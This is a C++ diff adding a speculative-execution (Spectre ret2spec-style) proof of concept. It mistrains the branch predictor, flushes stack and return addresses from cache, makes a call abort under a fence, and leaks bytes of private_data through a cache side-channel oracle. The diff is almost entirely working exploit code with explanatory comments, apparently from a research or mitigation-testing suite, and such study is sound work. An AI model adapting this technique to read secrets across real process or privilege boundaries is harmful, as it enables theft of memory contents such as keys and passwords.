@@ -73,6 +73,74 @@ static bool ReturnsTrue(int counter) {
   return true;
 }
 
+static int cond = 0;
+
+void baz() {
+  // mfence and lfence, closing speculation window
+  MemoryAndSpeculationBarrier();
+}
+
+bool bar() {
+  // Creates a stack mark and stores it to the global vector.
+  char stack_mark = 'a';
+  stack_mark_pointers.push_back(&stack_mark);
+
+  // Flush the condition variable.
+  FlushDataCacheLine(&cond);
+
+  if (cond == 0) {
+      // Cleans-up its stack mark and flushes from the cache everything between its
+    // own stack mark and the next one. Somewhere there must be also the return
+    // address.
+    stack_mark_pointers.pop_back();
+    FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
+    return 1;
+  }
+
+  // Cleans-up its stack mark and flushes from the cache everything between its
+  // own stack mark and the next one. Somewhere there must be also the return
+  // address.
+  stack_mark_pointers.pop_back();
+  FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
+  return 0;
+}
+
+void foo() {
+  // Creates a stack mark and stores it to the global vector.
+  char stack_mark = 'a';
+  stack_mark_pointers.push_back(&stack_mark);
+
+  // For branch predictor mistraining.
+  // Bar should return true.
+  cond = 0;
+  for (int i = 0; i < 5; i++) {
+    bar();
+  }
+
+  // Make the condition false and induce misspeculation.
+  // Bar should return false architecturally, but our goal is to
+  // make it return true speculatively.
+  cond = 1;
+  if (bar()) {
+    // Call to baz will push address of ForceRead's instructions on
+    // the RSB. Baz has a fence, causing speculation to fault.
+    baz();
+
+    // If RSB is not written under speculation, execution will not return
+    // to the if-body at all. However, if it is, then even though the
+    // pointer-into-RSB is restored, execution should jump here.
+    const std::array<BigByte, 256> &oracle = *oracle_ptr;
+    ForceRead(oracle.data() +
+      static_cast<unsigned char>(private_data[current_offset]));
+  }
+
+  // Cleans-up its stack mark and flushes from the cache everything between its
+  // own stack mark and the next one. Somewhere there must be also the return
+  // address.
+  stack_mark_pointers.pop_back();
+  FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
+}
+
 char Ret2specLeakByte() {
   CacheSideChannel sidechannel;
   oracle_ptr = &sidechannel.GetOracle();
@@ -86,6 +154,37 @@ char Ret2specLeakByte() {
     char stack_mark = 'a';
     stack_mark_pointers.push_back(&stack_mark);
     ReturnsTrue(kRecursionDepth);
+    stack_mark_pointers.pop_back();
+
+    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
+    if (result.first) {
+      return result.second;
+    }
+
+    if (run > 100000) {
+      std::cerr << "Does not converge " << result.second << std::endl;
+      exit(EXIT_FAILURE);
+    }
+  }
+}
+
+char Ret2AbortedCallLeakByte() {
+  CacheSideChannel sidechannel;
+  oracle_ptr = &sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = *oracle_ptr;
+
+  for (int run = 0;; ++run) {
+    sidechannel.FlushOracle();
+
+    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
+    // from an empty vector and crash.
+    char stack_mark = 'a';
+    stack_mark_pointers.push_back(&stack_mark);
+
+    // In our diagram, this is effectively the main function that calls foo
+    // and probes the cache for an access.
+    foo();
+
     stack_mark_pointers.pop_back();
 
     std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
